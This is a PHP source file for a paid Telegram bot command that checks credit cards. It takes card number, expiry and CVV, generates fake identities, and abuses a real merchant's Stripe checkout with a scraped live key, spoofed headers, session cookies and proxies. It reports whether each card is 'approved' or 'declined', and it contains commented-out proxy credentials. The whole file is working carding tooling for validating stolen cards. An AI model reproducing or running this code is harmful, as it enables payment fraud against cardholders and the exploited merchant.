<?php



$ownerData = file_get_contents('database/owner.txt');
if (strpos($ownerData, "$userId") !== false) {
    $rank = "OWNER"; 
} else {
    $paidData = file_get_contents('database/paid.txt');
    $pattern = "/User ID: $userId\nRank: (.+)\n/";
    if (preg_match($pattern, $paidData, $matches)) {
        $rank = $matches[1];
    } else {
        $rank = "FREE";
    }
}


  if((strpos($text, '/stp') === 0) or (strpos($text, '.stp') === 0) or ((strpos($text, '$stp') === 0) or (strpos($text, '!stp') === 0)) or ((strpos($text, '+stp') === 0) or (strpos($text, '#stp') === 0)) or (strpos($text, '?stp') === 0)) {


  $userData = file_get_contents('database/users.txt');
  if (strpos($userData, $userId) === false) {
  bot('sendMessage', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>Unregistered User! ⚠️</code>
[↯]Message: <code>You have to register first to use me</code>
You have to use <code>/register</code> to use me 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
      'reply_to_message_id' => $message_id,
      'parse_mode' => 'html'
  ]);
  return;
  }


  if (strlen($message) <= 4) {
              bot('sendMessage', [
          'chat_id' => $chat_id,
          'message_id' => $message_id,
          'text' => "<b>
  - - - - - - - - - - - - - - - - - - - - - - 
  [WRONG FORMAT] ⚠️
  - - - - - - - - - - - - - - - - - - - - - -
  Ex: <code>/ba cc|mm|yy|cvv</code>     
  Gateway <code>Stripe 15$ Charge</code>        
  - - - - - - - - - - - - - - - - - - - - - -
  </b>",
          'reply_to_message_id' => $message_id,
          'parse_mode' => 'html'
      ]);
  return;
  }  

  $paid = file_get_contents('database/paid.txt');
  if (preg_match('/User ID:\s*(\d+)/', $paid, $matches)) {
  $paids = $matches[1];
  }

  $owner = file_get_contents('database/owner.txt');
  $owners = explode("\n", $owner);

  $authgrp = file_get_contents('database/authgrp.txt');
  $authgrps = explode("\n", $authgrp);

      if (strpos($paid, "User ID: $userId") === false) {
          bot('sendMessage', [
              'chat_id' => $chat_id,
              'message_id' => $message_id,
              'text' => "<b>
- - - - - - - - - - - - - - - - - - - - - -
[↯]ACCESS DENIED! ❌⚠️
- - - - - - - - - - - - - - - - - - - - - -
[↯]Status: <code>User is broke!</code>
[↯]Message: <code>Got more holes in your wallet than Swiss cheese? Invest in my services and let's patch them up together!</code> 
- - - - - - - - - - - - - - - - - - - - - -
</b>",
              'reply_to_message_id' => $message_id,
              'parse_mode' => 'html'
          ]);
          return;
      }



  $spamResult = isSpamming($userId);
  if($spamResult !== false) {
  bot('sendMessage', [
      'chat_id' => $chat_id,
      'message_id' => $message_id,
      'text' => "<b>
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]ANTISPAM DETECTED! ⚠️
  - - - - - - - - - - - - - - - - - - - - - -
  [↯] Try again after $spamResult seconds !
  - - - - - - - - - - - - - - - - - - - - - -
  </b>",
      'reply_to_message_id' => $message_id,
      'parse_mode' => 'html'
  ]);
  return;
  }  
  //=========MAIN CODE===========//
  $start_time = microtime(true);

  $messageidtoedit50 = bot('sendmessage',[
            'chat_id'=>$chat_id,
            'text'=>"<b>Started checking...</b>",
            'parse_mode'=>'html',
            'reply_to_message_id'=> $message_id,

        ]);

        $messageidtoba = capture(json_encode($messageidtoedit50), '"message_id":', ',');

  if ($_SERVER['REQUEST_METHOD'] == "POST") {
      extract($_POST);
  } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
      extract($_GET);
  }


    $lista = substr($message, 5);
    $lista = clean($lista);
    $check = strlen($lista);
    $chem = substr($lista, 0, 1);
    $exploded = multiexplode(array(":", "/", " ", "|", ""), $lista);
    $cc = $exploded[0];
    $mes = $exploded[1];
    $ano = $exploded[2];
    $cvv = $exploded[3];

    if (empty($cc) || empty($mes) || empty($ano) || empty($cvv)) {
        bot('editMessageText', [
            'chat_id' => $chat_id,
            'message_id' => $messageidtoba,
            'text' => "!𝙔𝙤𝙪 𝘿𝙪𝙢𝙗𝙤 𝘼𝙨𝙨 𝙃𝙤𝙡𝙚!\n𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>/chkcc|mm|yy|cvv</code>-",
            'parse_mode' => 'html',
            'reply_to_message_id' => $messageidtoba,
            'disable_web_page_preview' => true
        ]);
        return;
    }

  $strlenn = strlen($cc);
  $strlen1 = strlen($mes);
  $ano1 = $ano;
  $lista = (''.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');


  $last4 = substr($cc, -4);

  //=========BANNED BIN=============//
  $bin = substr($cc, 0, 6);
  $bannedBins = file("banned.txt", FILE_IGNORE_NEW_LINES);

  if(in_array($bin, $bannedBins)) {
  bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoba,
              'text'=>"<b>
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]BIN BANNED! ⚠️
  - - - - - - - - - - - - - - - - - - - - - -
  [↯]CC: <code>$lista</code>
  [↯]Reason: <code>All Prepaid banned!</code>
  - - - - - - - - - - - - - - - - - - - - - -
  </b>",
              'parse_mode'=>'html',

          ]);
  return;
  }

    //---------------------//
  bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoba,
                'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Stripe 15$ Charge
  Status: <code>■□□□□ 20%[🟥]</code>
  Req: <code>@$username</code>
  </b>",
              'parse_mode'=>'html',

        ]);



  function value($str,$find_start,$find_end)
  {
      $start = @strpos($str,$find_start);
      if ($start === false) 
      {
            return "";
      }
      $length = strlen($find_start);
      $end    = strpos(substr($str,$start +$length),$find_end);
      return trim(substr($str,$start +$length,$end));
    }

  function GetStr($string, $start, $end) {
      $str = explode($start, $string);
      $str = explode($end, $str[1]);  
      return $str[0];
  }
  function inStr($string, $start, $end, $value) {
      $str = explode($start, $string);
      $str = explode($end, $str[$value]);
      return $str[0];
  }

  function pro($stringlength = 16) {
    return substr(str_shuffle(str_repeat($string='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', ceil($stringlength/strlen($string)) )),1,$stringlength);
  }

  #$key = pro();
  $web = pro();  



  function mod($dividendo,$divisor)
  {
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
  }
  //================[Functions and Variables]================//
  //=========================[PROXY]=========================//
  // $Websharegay = rand(0,250);
  // $rp1 = array(
  //       //1 => 'krmcyqke-rotate:9kanicwn8thd',
  //       1 => 'lookdvnz-rotate:mms1x3cqscnm',
  //       2 => 'gpwaqrjb-rotate:tv6dlsbhyywo',
  //       3 => 'vhpfjxsx-rotate:xmzs8124xvqg',
  //       4 => 'zhtwglvf-rotate:8okrq6e9k62o',
  // ); 
  // $rotate = $rp1[array_rand($rp1)];
  // $ch = curl_init('https://api.ipify.org/');
  // curl_setopt_array($ch, [
  // CURLOPT_RETURNTRANSFER => true,
  // CURLOPT_PROXY => 'http://p.webshare.io:80',
  // CURLOPT_PROXYUSERPWD => $rotate,
  // CURLOPT_HTTPGET => true,
  // ]);
  // $ip1 = curl_exec($ch);
  // curl_close($ch);
  // ob_flush();  
  // if (isset($ip1)) { $ip = "Live! ✅"; }
  // if (empty($ip1)) { $ip = "Dead! ❌"; }
  //=========================[Proxy Section-END]=========================//
  #------[Email Generator]------#
  function emailGenerate($length = 10)
  {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString . '@gmail.com';
  }
  $email = emailGenerate();
    #------[Username Generator]------#
  function usernameGen($length = 13)
  {
    $characters   = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
      return $randomString;
  }
  $un = usernameGen();
  #------[Password Generator]------#
  function passwordGen($length = 15)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $pass = passwordGen();

  #------[CC Type Randomizer]------#
  $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
    );
  $card_type = $cardNames[substr($cc, 0, 1)];





  //==================[Randomizing Details]======================//
  $ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, 'http://p.webshare.io:80');
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIE, 1); 
  curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  $resposta = curl_exec($ch);
  $firstname = value($resposta, '"first":"', '"');
  $lastname = value($resposta, '"last":"', '"');
  $phone = value($resposta, '"phone":"', '"');
  $zip = value($resposta, '"postcode":', ',');
  $postcode = value($resposta, '"postcode":', ',');
  $state = value($resposta, '"state":"', '"');
  $city = value($resposta, '"city":"', '"');
  $street = value($resposta, '"street":"', '"');
  $numero1 = substr($phone, 1,3);
  $numero2 = substr($phone, 6,3);
  $numero3 = substr($phone, 10,4);
  $num = $numero1.''.$numero2.''.$numero3;
  $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
  $serv_rnd = $serve_arr[array_rand($serve_arr)];
  $email= str_replace("example.com", $serv_rnd, $email);
  if($state=="Alabama"){ $state="AL";
  }else if($state=="alaska"){ $state="AK";
  }else if($state=="arizona"){ $state="AR";
  }else if($state=="california"){ $state="CA";
  }else if($state=="olorado"){ $state="CO";
  }else if($state=="connecticut"){ $state="CT";
  }else if($state=="delaware"){ $state="DE";
  }else if($state=="district of columbia"){ $state="DC";
  }else if($state=="florida"){ $state="FL";
  }else if($state=="georgia"){ $state="GA";
  }else if($state=="hawaii"){ $state="HI";
  }else if($state=="idaho"){ $state="ID";
  }else if($state=="illinois"){ $state="IL";
  }else if($state=="indiana"){ $state="IN";
  }else if($state=="iowa"){ $state="IA";
  }else if($state=="kansas"){ $state="KS";
  }else if($state=="kentucky"){ $state="KY";
  }else if($state=="louisiana"){ $state="LA";
  }else if($state=="maine"){ $state="ME";
  }else if($state=="maryland"){ $state="MD";
  }else if($state=="massachusetts"){ $state="MA";
  }else if($state=="michigan"){ $state="MI";
  }else if($state=="minnesota"){ $state="MN";
  }else if($state=="mississippi"){ $state="MS";
  }else if($state=="missouri"){ $state="MO";
  }else if($state=="montana"){ $state="MT";
  }else if($state=="nebraska"){ $state="NE";
  }else if($state=="nevada"){ $state="NV";
  }else if($state=="new hampshire"){ $state="NH";
  }else if($state=="new jersey"){ $state="NJ";
  }else if($state=="new mexico"){ $state="NM";
  }else if($state=="new york"){ $state="LA";
  }else if($state=="north carolina"){ $state="NC";
  }else if($state=="north dakota"){ $state="ND";
  }else if($state=="Ohio"){ $state="OH";
  }else if($state=="oklahoma"){ $state="OK";
  }else if($state=="oregon"){ $state="OR";
  }else if($state=="pennsylvania"){ $state="PA";
  }else if($state=="rhode Island"){ $state="RI";
  }else if($state=="south carolina"){ $state="SC";
  }else if($state=="south dakota"){ $state="SD";
  }else if($state=="tennessee"){ $state="TN";
  }else if($state=="texas"){ $state="TX";
  }else if($state=="utah"){ $state="UT";
  }else if($state=="vermont"){ $state="VT";
  }else if($state=="virginia"){ $state="VA";
  }else if($state=="washington"){ $state="WA";
  }else if($state=="west virginia"){ $state="WV";
  }else if($state=="wisconsin"){ $state="WI";
  }else if($state=="wyoming"){ $state="WY";
  }else{$state="KY";} 

  //==============[Randomizing Details-END]======================//
  bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoba,
              'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Stripe 15$ Charge
  Status: <code>□■□□□ 40%[🟦]</code>
  Req: <code>@$username</code>
  </b>",
              'parse_mode'=>'html',

          ]);

  //==================[BIN LOOK-UP]======================//
  $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$bin), true);
  $bin1 = $fim["bin"] ?? null;

    if ($bin1 !== null) {
        $brand = $fim["brand"];
        $country = $fim["country"];
        $country_name = $fim["country_name"];
        $country_flag = $fim["country_flag"];

        $country_currencies = $fim["country_currencies"];
        $bank = $fim["bank"];
        $level = $fim["level"];
        $type = $fim["type"];
  }
  //==================[BIN LOOK-UP-END]======================//
  //===========================[1st REQ]===========================//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'Host: api.stripe.com';
  $headers[] = 'Accept: application/json';
  $headers[] = 'Accept-Language: en-US,en;q=0.8';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Path: /v1/payment_methods';
  $headers[] = 'Origin: https://js.stripe.com';
  $headers[] = 'Referer: https://js.stripe.com/';
  $headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';
  $headers[] = 'sec-ch-ua-mobile: ?0';
  $headers[] = 'sec-ch-ua-platform: "Windows"';
  $headers[] = 'Sec-Fetch-Dest: empty';
  $headers[] = 'Sec-Fetch-Mode: cors';
  $headers[] = 'Sec-Fetch-Site: same-site';
  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=6204863b-c5f7-4163-95d4-c5219258ab4da41aaf&sid=0b74b8a4-beee-409f-af56-14bd73e8c857bdce2d&pasted_fields=number&payment_user_agent=stripe.js%2F5816dc8686%3B+stripe-js-v3%2F5816dc8686%3B+split-card-element&referrer=https%3A%2F%2Fwww.yasminmogahedtv.com&time_on_page=36286&key=pk_live_51HdbmyHNc8MTJAaGytBzUdQLnsyVtugsmpGoxyN6NwE9ip5CsvYgmwAgxB5JBcyGnORmoxbtZzdvMl4AN6TwejOX00t0lGfzmO');

  $result1 = curl_exec($ch);
  $id = trim(strip_tags(getStr($result1,'"id": "','"')));
  $brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));

  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');


  //===========================[2 REQ]===========================//
$ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://www.yasminmogahedtv.com/membership-account/membership-checkout/?level=4');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array(
    'authority: www.yasminmogahedtv.com',
    'method: POST',
    'path: /membership-account/membership-checkout/?level=4',
    'scheme: https',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'cnntent-Type: application/x-www-form-urlencoded',
    'cookie: __stripe_mid=6204863b-c5f7-4163-95d4-c5219258ab4da41aaf; PHPSESSID=ase4dca7qvoqrb794kblft64m6; pmpro_visit=1; __stripe_sid=0b74b8a4-beee-409f-af56-14bd73e8c857bdce2d',
    'origin: https://www.yasminmogahedtv.com',
    'referer: https://www.yasminmogahedtv.com/membership-account/membership-checkout/?level=4',
    'sec-Fetch-Dest: document',
    'sec-Fetch-Mode: navigate',
    'sec-Fetch-Site: same-origin',
    'user-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    );

  bot('editMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$messageidtoba,
        'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Stripe 15$ Charge
  Status: <code>□□■□□ 60%[🟩]</code>
  Req: <code>@$username</code>
  </b>",
        'parse_mode'=>'html',
        'disable_web_page_preview'=>'true'
  ]);
  //===========================[3 REQ]===========================//

  bot('editMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$messageidtoba,
        'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Stripe 15$ Charge
  Status: <code>□□□■□ 80%[🟦]</code>
  Req: <code>@$username</code>
  </b>",
        'parse_mode'=>'html',
        'disable_web_page_preview'=>'true'
  ]);
  //===========================[4 REQ]===========================//

  //===========================[4 REQ-END]===========================//
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=4&checkjavascript=1&other_discount_code=&username='.$pass.'&password=abhyan3434&password2=abhyan3434&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&telephone=09632581470&CardType='.$card_type.'&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

  $result2 = curl_exec($ch);
  $msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

  //===========================[RESPONSES]===========================//
bot('editMessageText',[
        'chat_id'=>$chat_id,
        'message_id'=>$messageidtoba,
        'text'=>"<b>
  🔴↯[CHECKING CARD]↯
  CC: <code>$lista</code>
  Gateway: Stripe 15$ Charge
  Status: <code>□□□□□ 100%[🟩]</code>
  Req: <code>@$username</code>
  </b>",
        'parse_mode'=>'html',
        'disable_web_page_preview'=>'true'
    ]);
    if (
        strpos($result2, 'Thank you for your membership.') !== false ||
        strpos($result2, "Membership Confirmation") !== false ||
        strpos($result2, 'Your card zip code is incorrect.') !== false ||
        strpos($result2, "Thank You For Donation.") !== false ||
        strpos($result2, "incorrect_zip") !== false ||
        strpos($result2, "Success ") !== false ||
        strpos($result2, '"type":"one-time"') !== false ||
        strpos($result2, "/donations/thank_you?donation_number=") !== false
    ) {
      $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
      $mes ="Thank You For Donation.";
}   elseif (
        strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
        strpos($result2, "Your card does not support this type of purchase.") !== false ||
        strpos($result2, 'transaction_not_allowed') !== false ||
        strpos($result2, "insufficient_funds") !== false ||
        strpos($result2, "incorrect_zip") !== false ||
        strpos($result2, "Your card has insufficient funds.") !== false ||
        strpos($result2, '"status":"success"') !== false ||
        strpos($result2, "stripe_3ds2_fingerprint") !== false
    ) {
        $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
        $mes ="Incorrect deatials it can be anything";
}   elseif (
            strpos($result2, 'security code is incorrect.') !== false ||
            strpos($result2, 'security code is invalid.') !== false ||
            strpos($result2, "Your card's security code is incorrect.") !== false
        ) {
        $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅";
        $mes ="Your card's security code is incorrect";
}   elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
        $resp = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌";
        $mes ="Error updating default payment method";
}   elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
        $resp = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌";
        $mes ="Please contact us to set up your membership";
}   else {
            $resp = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌";

    }
  $end_time = microtime(true);
  $time = number_format($end_time - $start_time, 2);
  //===========================[RESPONSES-END]===========================//
  //===========================[CHECKER]===========================//
  bot('editMessageText',[
      'chat_id'=>$chat_id,
      'message_id'=>$messageidtoba,
  'text'=>"<b>
  Stripe 15$ Charge
  - - - - - - - - - - - - - - - - - - - - - - - -
  [↯]Card: <code>$lista</code>
  [↯]Status:<code> $mes</code>
  [↯]Result:<code> $resp</code>
  - - - - - - - - - - - - - - - - - - - - - - - -
  [↯]Brand: <code>$brand</code>
  [↯]Type: <code>$type</code>
  [↯]Bank: <code>$bank</code>
  [↯]Country: <code>$country_name [$country_flag]</code>
  - - - - - - - - - - - - - - - - - - - - - - - -
  [ϟ]Time: <code>$time SEC</code> | IP: <code>Live ✅</code>
  - - - - - - - - - - - - - - - - - - - - - - - -
  [↯]Req: <b>@$username</b> [$rank]
  </b>",
      'parse_mode'=>'html',
      'disable_web_page_preview'=>'true'
  ]);
    recordBotResponseTimestamp($userId);
  }

  
